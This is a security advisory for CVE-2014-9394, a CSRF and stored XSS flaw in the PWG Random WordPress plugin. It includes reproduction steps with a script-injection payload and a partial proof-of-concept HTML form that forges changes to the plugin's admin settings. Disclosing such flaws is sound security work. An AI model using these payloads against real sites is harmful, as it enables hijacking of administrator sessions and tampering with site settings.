# Title: CSRF / Stored XSS Vulnerability in PWG Random Wordpress Plugin 
# Author: Manideep K	
# CVE-ID : CVE-2014-9394
# Plugin Homepage: https://wordpress.org/plugins/pwgrandom/
# Version Affected: 1.11 (probably lower versions)
# Severity: High 

# Description: 
# Vulnerable Parameter:  pwgrandom_title, pwgrandom_category etc
# About Vulnerability: This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 
# Vulnerability Class:   	
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29	        
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

Steps to Reproduce: (POC):
After installing the plugin

Stored XSS: 
1.	Goto settings -> PWGRandom
2.	Enter this payload – “ "><script>alert(32)</script> “ in any of the columns. There is no minimum input validation. Characters are being accepted where only option is to enter numbers.
3.	Save changes and see XSS in action
4.	Visit settings page of this plugin anytime later and you can see the script executing as it is stored. 

Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below

<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=pwgrandom" method="POST">
      <input type="hidden" name="pwgrandom&#95;submit&#95;hidden" value="Y" />
      <input type="hidden" name="pwgrandom&#95;title" value="test" />
      <input type="hidden" name="pwgrandom&#95;category" value="blah blahhhhh" />
      <input type="hidden" name="pwgrandom&#95;path" value="hi" />
      <input type="hidden" name="pwgrandom&#95;url&#95;path" value="dmdmdm" />
      <input type="hidden" name="pwgrandom&#95;size" value="this&#32;is&#32;not&#32;number&#32;" />
      <input type="hidden" name="pwgrandom&#95;nb&#95;images" value="dddff" />
      <input type="hidden" name="pwgrandom&#95;nb&#95;images&#95;row" value="1" />
      <input type="hidden" name="pwgrandom&#95;nb&#95;image&#95;spacing" value="dss" />

    </form>
